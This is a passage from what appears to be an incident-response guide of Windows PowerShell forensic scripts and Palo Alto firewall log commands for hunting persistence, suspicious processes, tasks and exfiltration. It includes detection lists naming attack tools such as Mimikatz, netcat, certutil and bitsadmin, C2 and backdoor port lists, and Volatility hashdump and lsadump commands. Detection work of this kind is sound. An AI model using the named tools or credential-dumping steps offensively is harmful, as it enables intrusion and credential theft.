Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" -ErrorAction SilentlyContinue |
  ForEach-Object {
    $debugger = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).Debugger
    if ($debugger) {
      Write-Host "SUSPICIOUS: $($_.PSChildName) -> Debugger: $debugger" -ForegroundColor Red
    }
  }

# --- AppInit DLLs (DLL injection) ---
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" -ErrorAction SilentlyContinue |
  Select-Object AppInit_DLLs, LoadAppInit_DLLs |
  Format-List

# --- Browser Helper Objects ---
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects\" -ErrorAction SilentlyContinue |
  ForEach-Object {
    $clsid = $_.PSChildName
    $name = (Get-ItemProperty "HKLM:\SOFTWARE\Classes\CLSID\$clsid" -ErrorAction SilentlyContinue).'(default)'
    Write-Host "BHO: $clsid - $name"
  }

# ===== RECENTLY ACCESSED FILES AND PROGRAMS =====

# --- Recent documents ---
Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Recent" -ErrorAction SilentlyContinue |
  Sort-Object LastWriteTime -Descending |
  Select-Object Name, LastWriteTime |
  Format-Table -AutoSize

# --- UserAssist (program execution tracking, ROT13 encoded) ---
# Use tools like UserAssistView or Registry Explorer for proper decoding
Get-ChildItem "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\*\Count" -ErrorAction SilentlyContinue
```

---

### 4. Process Explorer: Windows Process Analysis

```powershell [process-investigation-windows.ps1]
# ===== WINDOWS PROCESS INVESTIGATION =====

# --- List all processes with detailed information ---
Get-Process | Select-Object Id, ProcessName, Path, StartTime,
  @{Name="CPU_Seconds";Expression={$_.CPU}},
  @{Name="Memory_MB";Expression={[math]::Round($_.WorkingSet64/1MB,2)}},
  @{Name="CommandLine";Expression={(Get-CimInstance Win32_Process -Filter "ProcessId=$($_.Id)").CommandLine}} |
  Sort-Object StartTime -Descending |
  Format-Table -AutoSize -Wrap

# --- Find processes without a valid digital signature ---
Get-Process | ForEach-Object {
    $sig = Get-AuthenticodeSignature $_.Path -ErrorAction SilentlyContinue
    if ($sig.Status -ne "Valid") {
        [PSCustomObject]@{
            PID = $_.Id
            Name = $_.ProcessName
            Path = $_.Path
            SignatureStatus = $sig.Status
            StartTime = $_.StartTime
        }
    }
} | Format-Table -AutoSize

# --- Find processes running from unusual locations ---
Get-Process | Where-Object {
    $_.Path -and
    $_.Path -notmatch "C:\\Windows|C:\\Program Files|C:\\Program Files \(x86\)"
} | Select-Object Id, ProcessName, Path, StartTime | Format-Table -AutoSize

# --- Parent-child process relationships ---
Get-CimInstance Win32_Process |
  Select-Object ProcessId, ParentProcessId, Name, CommandLine,
    @{Name="ParentName";Expression={(Get-Process -Id $_.ParentProcessId -ErrorAction SilentlyContinue).ProcessName}} |
  Format-Table -AutoSize -Wrap

# --- Look for suspicious parent-child relationships ---
# Examples of suspicious:
# - winword.exe spawning cmd.exe or powershell.exe
# - svchost.exe not parented by services.exe
# - explorer.exe spawning powershell.exe with encoded commands

Get-CimInstance Win32_Process | ForEach-Object {
    $parent = Get-Process -Id $_.ParentProcessId -ErrorAction SilentlyContinue
    $suspicious = $false

    # Check for Office spawning shell
    if ($parent.ProcessName -match "WINWORD|EXCEL|POWERPNT|OUTLOOK" -and
        $_.Name -match "cmd|powershell|wscript|cscript|mshta") {
        $suspicious = $true
    }

    # Check for svchost not parented by services.exe
    if ($_.Name -eq "svchost.exe" -and $parent.ProcessName -ne "services") {
        $suspicious = $true
    }

    if ($suspicious) {
        Write-Host "SUSPICIOUS: $($parent.ProcessName) ($($_.ParentProcessId)) -> $($_.Name) ($($_.ProcessId))" -ForegroundColor Red
        Write-Host "  Command: $($_.CommandLine)" -ForegroundColor Yellow
    }
}

# --- Network connections per process ---
Get-NetTCPConnection -State Established -ErrorAction SilentlyContinue |
  Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess,
    @{Name="ProcessName";Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).ProcessName}},
    @{Name="ProcessPath";Expression={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}} |
  Format-Table -AutoSize

# --- Check for DLL injection indicators ---
Get-Process | ForEach-Object {
    $modules = $_.Modules | Where-Object { $_.FileName -notmatch "Windows|System32|SysWOW64|Program Files" }
    if ($modules) {
        Write-Host "`nProcess: $($_.ProcessName) (PID: $($_.Id))" -ForegroundColor Yellow
        $modules | Select-Object FileName | Format-Table -AutoSize
    }
}
```

---

### 5. Task Scheduler Forensics: Persistence Hunting

```powershell [scheduled-task-investigation.ps1]
# ===== SCHEDULED TASK INVESTIGATION =====

# --- List all scheduled tasks with details ---
Get-ScheduledTask | Where-Object { $_.State -ne "Disabled" } |
  ForEach-Object {
    $info = Get-ScheduledTaskInfo $_.TaskName -TaskPath $_.TaskPath -ErrorAction SilentlyContinue
    [PSCustomObject]@{
        TaskName = $_.TaskName
        TaskPath = $_.TaskPath
        State = $_.State
        Author = $_.Author
        Action = ($_.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join "; "
        Trigger = ($_.Triggers | ForEach-Object { $_.ToString() }) -join "; "
        LastRunTime = $info.LastRunTime
        NextRunTime = $info.NextRunTime
        LastResult = $info.LastTaskResult
    }
  } | Format-List

# --- Find suspicious scheduled tasks ---
Get-ScheduledTask | ForEach-Object {
    $actions = $_.Actions
    foreach ($action in $actions) {
        $exe = $action.Execute
        if ($exe -match "powershell|cmd|wscript|cscript|mshta|certutil|bitsadmin|rundll32|regsvr32|msiexec") {
            Write-Host "SUSPICIOUS TASK: $($_.TaskName)" -ForegroundColor Red
            Write-Host "  Path: $($_.TaskPath)" -ForegroundColor Yellow
            Write-Host "  Execute: $exe" -ForegroundColor Yellow
            Write-Host "  Arguments: $($action.Arguments)" -ForegroundColor Yellow
            Write-Host "  Author: $($_.Author)" -ForegroundColor Yellow
            Write-Host ""
        }
    }
}

# --- Check task scheduler event log ---
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-TaskScheduler/Operational'; StartTime=(Get-Date).AddDays(-7)} -ErrorAction SilentlyContinue |
  Where-Object { $_.Id -in @(106, 140, 141, 200, 201) } |
  Select-Object TimeCreated, Id,
    @{Name="EventType";Expression={
        switch ($_.Id) {
            106 { "Task Registered" }
            140 { "Task Updated" }
            141 { "Task Removed" }
            200 { "Task Started" }
            201 { "Task Completed" }
        }
    }}, Message |
  Format-Table -AutoSize -Wrap

# --- Export scheduled tasks for offline analysis ---
schtasks /query /fo CSV /v > C:\IR\scheduled_tasks_full.csv

# --- Check for tasks in XML format (may reveal hidden details) ---
Get-ChildItem "C:\Windows\System32\Tasks" -Recurse -File -ErrorAction SilentlyContinue |
  ForEach-Object {
    $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
    if ($content -match "powershell|cmd\.exe|http|ftp|download") {
        Write-Host "SUSPICIOUS TASK FILE: $($_.FullName)" -ForegroundColor Red
    }
  }
```

---

### 6. SAM Analysis: Windows User Investigation

```powershell [user-investigation-windows.ps1]
# ===== WINDOWS USER ACCOUNT INVESTIGATION =====

# --- List all local user accounts ---
Get-LocalUser | Select-Object Name, Enabled, LastLogon, PasswordLastSet,
  PasswordRequired, UserMayChangePassword, Description |
  Format-Table -AutoSize

# --- List all local group memberships ---
Get-LocalGroup | ForEach-Object {
    $members = Get-LocalGroupMember $_.Name -ErrorAction SilentlyContinue
    if ($members) {
        Write-Host "`n=== Group: $($_.Name) ===" -ForegroundColor Yellow
        $members | Select-Object Name, ObjectClass, PrincipalSource | Format-Table -AutoSize
    }
}

# --- Find recently created accounts ---
Get-LocalUser | Where-Object {
    $_.PasswordLastSet -gt (Get-Date).AddDays(-30)
} | Select-Object Name, Enabled, PasswordLastSet, LastLogon |
  Format-Table -AutoSize

# --- Check for hidden/suspicious accounts ---
# Accounts ending with $ are often hidden
Get-LocalUser | Where-Object { $_.Name -match '\$$' -or $_.Name.Length -gt 20 } |
  Select-Object Name, Enabled, Description

# --- Active Directory Investigation (if domain-joined) ---
# Recently created AD accounts
Get-ADUser -Filter {WhenCreated -gt $((Get-Date).AddDays(-30))} -Properties WhenCreated, LastLogonDate, Enabled |
  Select-Object Name, SamAccountName, WhenCreated, LastLogonDate, Enabled |
  Sort-Object WhenCreated -Descending |
  Format-Table -AutoSize

# --- Check for accounts with AdminCount=1 (domain admin equivalent) ---
Get-ADUser -Filter {AdminCount -eq 1} -Properties AdminCount, LastLogonDate, Enabled |
  Select-Object Name, SamAccountName, Enabled, LastLogonDate |
  Format-Table -AutoSize

# --- Check for Kerberoastable accounts (SPN set on user accounts) ---
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, LastLogonDate |
  Select-Object Name, SamAccountName, ServicePrincipalName, LastLogonDate |
  Format-Table -AutoSize

# --- Login events for specific user ---
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} |
  Where-Object { $_.Properties[5].Value -eq "suspicious_user" } |
  Select-Object TimeCreated,
    @{Name="LogonType";Expression={$_.Properties[8].Value}},
    @{Name="SourceIP";Expression={$_.Properties[18].Value}} |
  Format-Table -AutoSize
```

---

### 7. NTFS Analysis: File System Investigation

```powershell [filesystem-investigation-windows.ps1]
# ===== NTFS FILE SYSTEM FORENSICS =====

# --- Find recently created executable files ---
Get-ChildItem -Path C:\ -Recurse -Include *.exe,*.dll,*.ps1,*.bat,*.cmd,*.vbs,*.js,*.hta -ErrorAction SilentlyContinue |
  Where-Object { $_.CreationTime -gt (Get-Date).AddDays(-7) } |
  Select-Object FullName, CreationTime, LastWriteTime, Length,
    @{Name="Signed";Expression={(Get-AuthenticodeSignature $_.FullName).Status}} |
  Sort-Object CreationTime -Descending |
  Format-Table -AutoSize

# --- Check for Alternate Data Streams (ADS) ---
# ADS can hide malicious content within legitimate files
Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue |
  ForEach-Object {
    $streams = Get-Item $_.FullName -Stream * -ErrorAction SilentlyContinue |
      Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' }
    if ($streams) {
        Write-Host "ADS Found: $($_.FullName)" -ForegroundColor Red
        $streams | Select-Object Stream, Length | Format-Table -AutoSize
    }
  }

# --- Read suspicious ADS content ---
# Get-Content -Path "C:\Users\Public\document.txt" -Stream "hidden_stream"

# --- Find files in suspicious locations ---
$suspiciousLocations = @(
    "C:\Windows\Temp",
    "C:\Users\Public",
    "C:\ProgramData",
    "$env:TEMP",
    "C:\Windows\System32\spool\drivers\color",
    "C:\Windows\debug",
    "C:\Recycler"
)

foreach ($location in $suspiciousLocations) {
    $files = Get-ChildItem $location -Recurse -File -ErrorAction SilentlyContinue |
      Where-Object { $_.Extension -match "\.(exe|dll|ps1|bat|cmd|vbs|js|hta|scr)$" }
    if ($files) {
        Write-Host "`n=== Executables in: $location ===" -ForegroundColor Yellow
        $files | Select-Object FullName, CreationTime, Length | Format-Table -AutoSize
    }
}

# --- Check Recycle Bin for deleted evidence ---
$recycleBin = (New-Object -ComObject Shell.Application).Namespace(0x0a)
$recycleBin.Items() | ForEach-Object {
    [PSCustomObject]@{
        Name = $_.Name
        Path = $_.Path
        Size = $_.Size
        DeletedDate = $recycleBin.GetDetailsOf($_, 2)
        OriginalLocation = $recycleBin.GetDetailsOf($_, 1)
    }
} | Format-Table -AutoSize

# --- MFT Analysis (requires elevated privileges and raw disk access) ---
# Use tools like MFTECmd from Eric Zimmerman's toolkit
# MFTECmd.exe -f "C:\$MFT" --csv C:\IR\mft_output\ --csvf mft_analysis.csv
```

---

### 8. Execution Artifacts: Prefetch Forensics

```powershell [prefetch-shimcache-analysis.ps1]
# ===== PREFETCH ANALYSIS =====
# Prefetch files show program execution history (last 8 executions on Win10+)
# Location: C:\Windows\Prefetch

# --- List all prefetch files sorted by last modified ---
Get-ChildItem "C:\Windows\Prefetch\*.pf" -ErrorAction SilentlyContinue |
  Sort-Object LastWriteTime -Descending |
  Select-Object Name, LastWriteTime, CreationTime, Length |
  Format-Table -AutoSize

# --- Find suspicious prefetch entries ---
$suspiciousNames = @("PSEXEC", "MIMIKATZ", "PROCDUMP", "LAZAGNE", "BLOODHOUND",
  "SHARPHOUND", "RUBEUS", "CERTIFY", "COBALTSTRIKE", "METERPRETER",
  "POWERVIEW", "NMAP", "WHOAMI", "NLTEST", "DSQUERY", "WMIC",
  "NETCAT", "NC", "CERTUTIL", "BITSADMIN", "MSHTA", "WSCRIPT", "CSCRIPT")

Get-ChildItem "C:\Windows\Prefetch\*.pf" -ErrorAction SilentlyContinue |
  Where-Object {
    $name = $_.BaseName
    $suspiciousNames | Where-Object { $name -like "*$_*" }
  } | Select-Object Name, LastWriteTime, CreationTime |
  Format-Table -AutoSize

# --- Parse prefetch files using PECmd (Eric Zimmerman) ---
# PECmd.exe -d "C:\Windows\Prefetch" --csv C:\IR\prefetch_output\ --csvf prefetch_analysis.csv

# ===== SHIMCACHE (APPCOMPATCACHE) ANALYSIS =====
# Shimcache tracks program execution and file existence checks
# Stored in: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache

# --- Extract Shimcache using AppCompatCacheParser ---
# AppCompatCacheParser.exe -f C:\Windows\System32\config\SYSTEM --csv C:\IR\shimcache\ --csvf shimcache.csv

# --- Using PowerShell to check Shimcache (basic) ---
$shimcache = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -ErrorAction SilentlyContinue
if ($shimcache) {
    Write-Host "Shimcache data found - use AppCompatCacheParser for proper analysis" -ForegroundColor Yellow
    Write-Host "Data size: $($shimcache.AppCompatCache.Length) bytes"
}

# ===== AMCACHE ANALYSIS =====
# Amcache tracks program installation and execution
# Location: C:\Windows\appcompat\Programs\Amcache.hve

# --- Parse Amcache using AmcacheParser ---
# AmcacheParser.exe -f "C:\Windows\appcompat\Programs\Amcache.hve" --csv C:\IR\amcache\ --csvf amcache.csv
```

---

### 9. Defender Forensics: AV Log Analysis

```powershell [defender-investigation.ps1]
# ===== WINDOWS DEFENDER INVESTIGATION =====

# --- Check Windows Defender threat history ---
Get-MpThreatDetection | Select-Object DetectionID, DomainUser, ProcessName,
  InitialDetectionTime, LastThreatStatusChangeTime, ThreatStatusErrorCode,
  @{Name="ThreatName";Expression={(Get-MpThreat -ThreatID $_.ThreatID).ThreatName}},
  @{Name="Severity";Expression={(Get-MpThreat -ThreatID $_.ThreatID).SeverityID}},
  @{Name="Resources";Expression={$_.Resources -join "; "}} |
  Sort-Object InitialDetectionTime -Descending |
  Format-List

# --- Current threat catalog ---
Get-MpThreat | Select-Object ThreatID, ThreatName, SeverityID, IsActive,
  CategoryID, RollupStatus |
  Format-Table -AutoSize

# --- Check Defender configuration ---
Get-MpComputerStatus | Select-Object AntivirusEnabled, AntispywareEnabled,
  RealTimeProtectionEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled,
  NISEnabled, AntivirusSignatureLastUpdated, FullScanAge, QuickScanAge

# --- Check for Defender exclusions (attackers often add exclusions) ---
$prefs = Get-MpPreference
Write-Host "`n=== Path Exclusions ===" -ForegroundColor Yellow
$prefs.ExclusionPath
Write-Host "`n=== Process Exclusions ===" -ForegroundColor Yellow
$prefs.ExclusionProcess
Write-Host "`n=== Extension Exclusions ===" -ForegroundColor Yellow
$prefs.ExclusionExtension
Write-Host "`n=== IP Exclusions ===" -ForegroundColor Yellow
$prefs.ExclusionIpAddress

# --- Check for Defender tampering ---
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Windows Defender/Operational'; StartTime=(Get-Date).AddDays(-30)} -ErrorAction SilentlyContinue |
  Where-Object { $_.Id -in @(5001, 5004, 5007, 5010, 5012, 1116, 1117) } |
  Select-Object TimeCreated, Id,
    @{Name="EventType";Expression={
        switch ($_.Id) {
            5001 { "Real-time protection DISABLED" }
            5004 { "Configuration changed" }
            5007 { "Configuration changed" }
            5010 { "Scanning disabled" }
            5012 { "Scanning disabled" }
            1116 { "Malware detected" }
            1117 { "Malware action taken" }
        }
    }}, Message |
  Format-Table -AutoSize -Wrap

# --- Check quarantine folder ---
Get-ChildItem "C:\ProgramData\Microsoft\Windows Defender\Quarantine" -Recurse -ErrorAction SilentlyContinue |
  Select-Object FullName, CreationTime, Length |
  Format-Table -AutoSize
```

---

### 10. Crash Dump Forensics: Memory Analysis

```powershell [memory-analysis-windows.ps1]
# ===== WINDOWS MEMORY ACQUISITION =====

# --- Using WinPmem (recommended for IR) ---
# winpmem_mini_x64.exe C:\IR\memory_dump.raw

# --- Using DumpIt (Magnet Forensics) ---
# DumpIt.exe /OUTPUT C:\IR\memory_dump.raw /QUIET

# --- Using built-in tools ---
# Create a complete memory dump via Task Manager (right-click process > Create dump file)

# --- Check for existing crash dumps ---
Get-ChildItem "C:\Windows\MEMORY.DMP" -ErrorAction SilentlyContinue
Get-ChildItem "C:\Windows\Minidump\*.dmp" -ErrorAction SilentlyContinue

# ===== VOLATILITY 3 ANALYSIS (WINDOWS) =====

# Assumes memory dump acquired and Volatility 3 installed on forensic workstation

# --- Identify Windows version ---
# vol -f C:\IR\memory_dump.raw windows.info.Info

# --- List all processes ---
# vol -f C:\IR\memory_dump.raw windows.pslist.PsList

# --- Process tree ---
# vol -f C:\IR\memory_dump.raw windows.pstree.PsTree

# --- Hidden processes (compare pslist vs psscan) ---
# vol -f C:\IR\memory_dump.raw windows.psscan.PsScan

# --- Network connections ---
# vol -f C:\IR\memory_dump.raw windows.netscan.NetScan

# --- Command line arguments ---
# vol -f C:\IR\memory_dump.raw windows.cmdline.CmdLine

# --- DLL injection detection ---
# vol -f C:\IR\memory_dump.raw windows.malfind.Malfind

# --- Registry analysis from memory ---
# vol -f C:\IR\memory_dump.raw windows.registry.hivelist.HiveList
# vol -f C:\IR\memory_dump.raw windows.registry.printkey.PrintKey --key "Software\Microsoft\Windows\CurrentVersion\Run"

# --- Extract files from memory ---
# vol -f C:\IR\memory_dump.raw windows.dumpfiles.DumpFiles --pid 6789

# --- Check for credential artifacts ---
# vol -f C:\IR\memory_dump.raw windows.hashdump.Hashdump
# vol -f C:\IR\memory_dump.raw windows.lsadump.Lsadump

# ===== LIVE MEMORY TRIAGE (Without Full Dump) =====

# --- Check for injected threads ---
Get-Process | ForEach-Object {
    $threads = (Get-Process -Id $_.Id -ErrorAction SilentlyContinue).Threads
    $suspiciousThreads = $threads | Where-Object { $_.StartAddress -ne 0 -and $_.WaitReason -eq 'Suspended' }
    if ($suspiciousThreads.Count -gt 3) {
        Write-Host "Process $($_.ProcessName) (PID: $($_.Id)) has $($suspiciousThreads.Count) suspended threads" -ForegroundColor Yellow
    }
}
```

---

## Palo Alto IR: Firewall Forensics

::note
This section covers incident response procedures specific to Palo Alto Networks firewalls (PAN-OS). Commands use both the CLI and web interface references. All examples include real-world investigation scenarios.
::

---

### 1. Threat Detection: PAN Threat Log Review

```text [pa-threat-log-analysis.txt]
# ===== PALO ALTO THREAT LOG ANALYSIS =====

# --- CLI: View recent threat logs ---
> show log threat direction equal backward last-n-logs 50

# --- CLI: Filter threat logs by severity ---
> show log threat severity equal critical last-n-logs 100
> show log threat severity equal high last-n-logs 100

# --- CLI: Search for specific threat signatures ---
> show log threat threatid equal 41000   # Example: Command Injection
> show log threat threatid equal 42000   # Example: SQL Injection

# --- CLI: Filter by source IP ---
> show log threat src equal 10.0.1.100

# --- CLI: Filter by destination IP ---
> show log threat dst equal 203.0.113.50

# --- CLI: Filter by time range ---
> show log threat receive_time in 2024/01/15 direction equal backward

# --- CLI: Check for specific attack categories ---
> show log threat category equal brute-force
> show log threat category equal code-execution
> show log threat category equal command-and-control
> show log threat category equal exploit-kit
> show log threat category equal info-leak

# ===== KEY THREAT CATEGORIES TO INVESTIGATE =====
#
# brute-force          - Credential stuffing/brute force attacks
# code-execution       - Remote code execution attempts
# command-and-control  - C2 communication detected
# data-theft           - Data exfiltration indicators
# exploit-kit          - Known exploit kit traffic
# info-leak            - Information disclosure
# overflow             - Buffer overflow attempts
# phishing             - Phishing sites accessed
# scan                 - Port/vulnerability scanning
# spyware              - Spyware communication

# --- Web UI Path ---
# Monitor > Logs > Threat
# Apply filters:
# (severity eq critical) or (severity eq high)
# (receive_time geq '2024/01/15 00:00:00') and (receive_time leq '2024/01/16 00:00:00')
```

---

### 2. Network Flow: Traffic Log Analysis

```text [pa-traffic-log-analysis.txt]
# ===== TRAFFIC LOG INVESTIGATION =====

# --- CLI: View recent traffic logs ---
> show log traffic direction equal backward last-n-logs 100

# --- CLI: Large data transfers (potential exfiltration) ---
> show log traffic bytes_sent geq 104857600 direction equal backward
# 104857600 bytes = 100 MB

# --- CLI: Connections to specific destination ---
> show log traffic dst equal 203.0.113.50

# --- CLI: Traffic from compromised host ---
> show log traffic src equal 10.0.1.100 direction equal backward last-n-logs 500

# --- CLI: Sessions denied by security policy ---
> show log traffic action equal deny direction equal backward last-n-logs 100

# --- CLI: Check for unusual port usage ---
> show log traffic dport equal 4444    # Metasploit default
> show log traffic dport equal 1337    # Common backdoor
> show log traffic dport equal 8080    # Common C2
> show log traffic dport equal 8888    # Common C2
> show log traffic dport equal 31337   # Classic backdoor

# --- CLI: DNS traffic analysis (port 53) ---
> show log traffic dport equal 53 action equal allow src equal 10.0.1.100

# --- CLI: Sessions summary ---
> show session all filter source 10.0.1.100

# --- CLI: Active sessions from compromised host ---
> show session all filter source 10.0.1.100 state active

# --- CLI: Session details for specific session ---
> show session id <session-id>

# --- Web UI Investigation Steps ---
# Monitor > Logs > Traffic
# 
# Key filters for investigation:
# (addr.src in 10.0.1.100) and (bytes_sent geq 10485760)
# (addr.dst in 203.0.113.50)
# (action eq deny) and (receive_time geq '2024/01/15 00:00:00')
#
# Export results:
# Click export icon > CSV format for SIEM ingestion

# ===== TRAFFIC PATTERN ANALYSIS =====

# Look for beaconing patterns:
# - Regular interval connections (every 60s, 300s, 3600s)
# - Same destination with similar byte counts
# - Connections during non-business hours
# - Encrypted connections to unusual destinations

# CLI: Check for regular interval connections
> show log traffic dst equal 203.0.113.50 src equal 10.0.1.100 direction equal backward last-n-logs 500
# Export and analyze timestamps for regular intervals
```

---

### 3. Web Traffic: URL Filtering Analysis

```text [pa-url-filtering-analysis.txt]
# ===== URL FILTERING LOG ANALYSIS =====

# --- CLI: View URL filtering logs ---
> show log url direction equal backward last-n-logs 100

# --- CLI: Check for malware domain access ---
> show log url category equal malware

# --- CLI: Check for phishing site access ---
> show log url category equal phishing

# --- CLI: Check for command-and-control domains ---
> show log url category equal command-and-control

# --- CLI: Check for newly registered domains ---
> show log url category equal newly-registered-domain

# --- CLI: URLs accessed by compromised host ---
> show log url src equal 10.0.1.100 direction equal backward last-n-logs 500

# --- CLI: Check for dynamic DNS domains ---
> show log url category equal dynamic-dns

# --- CLI: Check for proxy avoidance ---
> show log url category equal proxy-avoidance-and-anonymizers

# --- CLI: URLs allowed despite risk ---
> show log url action equal alert direction equal backward

# ===== URL CATEGORIES OF INTEREST DURING IR =====
#
# command-and-control      - Active C2 communication
# malware                  - Known malware distribution
# phishing                 - Credential harvesting
# dynamic-dns              - Often used for C2
# newly-registered-domain  - Potential DGA domains
# grayware                 - Potentially unwanted apps
# hacking                  - Hacking tools/resources
# proxy-avoidance          - Anonymization attempts
# questionable             - Suspicious content
# unknown                  - Uncategorized (review manually)

# --- Web UI ---
# Monitor > Logs > URL Filtering
# Filter: (category eq malware) or (category eq command-and-control) or (category eq phishing)
```

---

### 4. Cloud Analysis: WildFire Submission Logs

```text [pa-wildfire-analysis.txt]
# ===== WILDFIRE SUBMISSION ANALYSIS =====

# --- CLI: View WildFire submissions ---
> show log wildfire direction equal backward last-n-logs 100

# --- CLI: Check for malicious verdicts ---
> show log wildfire verdict equal malicious direction equal backward

# --- CLI: Check specific file submissions ---
> show log wildfire src equal 10.0.1.100 direction equal backward

# --- CLI: WildFire statistics ---
> show wildfire statistics

# --- CLI: Check WildFire cloud connectivity ---
> test wildfire registration

# --- CLI: View latest WildFire analysis details ---
> show wildfire latest report direction equal backward

# ===== WILDFIRE VERDICT TYPES =====
#
# benign     - File is safe
# malware    - File is malicious
# grayware   - File is potentially unwanted
# phishing   - File is associated with phishing
# pending    - Analysis in progress
# error      - Analysis failed

# ===== INVESTIGATION STEPS =====
#
# 1. Identify all malicious verdicts in the time window
# 2. Note SHA256 hashes of malicious files
# 3. Check which users/hosts downloaded the files
# 4. Cross-reference with threat logs for related alerts
# 5. Check WildFire portal for detailed analysis reports
#
# WildFire Portal: https://wildfire.paloaltonetworks.com
# - Upload SHA256 hash to get full report
# - Review behavioral analysis
# - Check network indicators (domains, IPs contacted)
# - Download PCAP of sandbox execution
# - Review process trees and file system changes

# --- Web UI ---
# Monitor > Logs > WildFire Submissions
# Filter: (verdict eq malicious) and (receive_time geq '2024/01/15 00:00:00')
```

---

### 5. VPN Forensics: GlobalProtect Log Analysis

```text [pa-globalprotect-analysis.txt]
# ===== GLOBALPROTECT VPN INVESTIGATION =====

# --- CLI: View GlobalProtect logs ---
> show log system subtype equal globalprotect direction equal backward last-n-logs 200

# --- CLI: Check for login events ---
> show log system subtype equal globalprotect eventid equal globalprotectgateway-login-succ
> show log system subtype equal globalprotect eventid equal globalprotectgateway-login-fail

# --- CLI: Check connected VPN users ---
> show global-protect-gateway current-user

# --- CLI: Previous VPN sessions ---
> show global-protect-gateway previous-user

# --- CLI: Specific user VPN activity ---
> show log system subtype equal globalprotect user equal "domain\username"

# ===== GLOBALPROTECT INVESTIGATION CHECKLIST =====
#
# 1. Login anomalies:
#    □ Logins from unusual geographic locations
#    □ Simultaneous sessions from different IPs
#    □ Logins outside business hours
#    □ Failed login bursts followed by success
#    □ Connections from known VPN/TOR exit nodes
#
# 2. Session analysis:
#    □ Unusual data transfer volumes
#    □ Connections to internal resources not typically accessed
#    □ Long-duration sessions
#    □ Sessions from unmanaged devices (HIP check failures)
#
# 3. Post-connection activity:
#    □ Cross-reference VPN user IP with traffic logs
#    □ Check what internal resources were accessed
#    □ Look for lateral movement from VPN IP
#    □ Check for data exfiltration patterns

# --- CLI: Check HIP (Host Information Profile) reports ---
> show global-protect-gateway hip-report user equal "domain\username"
# HIP reports show device compliance status:
# - OS version and patch level
# - Antivirus status
# - Disk encryption status
# - Host firewall status

# --- Web UI ---
# Monitor > Logs > System
# Filter: (subtype eq globalprotect)
# Monitor > GlobalProtect > Gateway > Current Users
```

---

### 6. Identity Tracking: User-ID Investigation

```text [pa-userid-analysis.txt]
# ===== USER-ID MAPPING VERIFICATION =====

# --- CLI: Show current User-ID mappings ---
> show user ip-user-mapping all

# Example output:
# IP              Vsys   From     User                 Timeout(s)
# 10.0.1.100      vsys1  AD       domain\jsmith        7200
# 10.0.1.101      vsys1  AD       domain\admin          7200
# 10.0.1.200      vsys1  UNKNOWN  unknown              0

# --- CLI: Show User-ID mapping for specific IP ---
> show user ip-user-mapping ip 10.0.1.100

# --- CLI: Check User-ID agent connectivity ---
> show user user-id-agent state all

# --- CLI: Show group mapping ---
> show user group list

# --- CLI: Show members of specific group ---
> show user group name "domain\Domain Admins"

# ===== USER-ID INVESTIGATION FOCUS =====
#
# 1. Verify IP-to-user mappings are correct:
#    - Compare against AD logon events
#    - Check for IP address spoofing
#    - Verify DHCP lease assignments
#
# 2. Identify mapping gaps:
#    - IPs without user mapping (UNKNOWN)
#    - May indicate rogue devices or spoofed connections
#
# 3. Cross-reference with incident:
#    - Which user was mapped to the compromised IP?
#    - Was the mapping active during the incident window?
#    - Could the mapping have been manipulated?

# --- CLI: Clear specific mapping (if compromised) ---
> debug user-id reset ip-user 10.0.1.100

# --- CLI: User-ID statistics ---
> show user user-id-agent statistics
```

---

### 7. Application Detection: App-ID Analysis

```text [pa-appid-analysis.txt]
# ===== APP-ID INVESTIGATION =====

# --- CLI: View application usage by host ---
> show log traffic src equal 10.0.1.100 direction equal backward last-n-logs 500
# Review the 'app' column for each session

# --- CLI: Check for suspicious applications ---
> show log traffic app equal unknown-tcp direction equal backward
> show log traffic app equal unknown-udp direction equal backward
> show log traffic app equal ssh direction equal backward
> show log traffic app equal remote-desktop direction equal backward

# --- CLI: Check for tunneling applications ---
> show log traffic app equal dns-over-https direction equal backward
> show log traffic app equal ssl direction equal backward
> show log traffic app equal ipsec direction equal backward

# --- CLI: Application statistics ---
> show running application statistics

# ===== SUSPICIOUS APP-ID PATTERNS =====
#
# unknown-tcp / unknown-udp:
#   - Custom C2 protocols
#   - Encrypted tunnels
#   - Non-standard applications
#
# ssl / web-browsing on non-standard ports:
#   - Encrypted C2 on unusual ports
#   - Proxy tunneling
#
# dns / dns-over-https:
#   - DNS tunneling for C2 or data exfiltration
#   - Check for unusually large DNS queries/responses
#
# ssh / remote-desktop / vnc / teamviewer:
#   - Unauthorized remote access
#   - Verify these are expected from the source
#
# ftp / tftp / scp:
#   - Data exfiltration methods
#   - Check volume and destination

# --- Web UI ---
# Monitor > Logs > Traffic
# Filter: (app eq unknown-tcp) or (app eq unknown-udp)
# ACC > Network Activity (for application usage overview)
```

---

### 8. Intrusion Prevention: IPS Signature Analysis

```text [pa-ips-analysis.txt]
# ===== IPS/VULNERABILITY PROTECTION ANALYSIS =====

# --- CLI: View IPS triggered events ---
> show log threat type equal vulnerability direction equal backward last-n-logs 200

# --- CLI: Critical and high severity IPS events ---
> show log threat type equal vulnerability severity equal critical direction equal backward
> show log threat type equal vulnerability severity equal high direction equal backward

# --- CLI: IPS events for specific CVE ---
# Search by threat name or ID
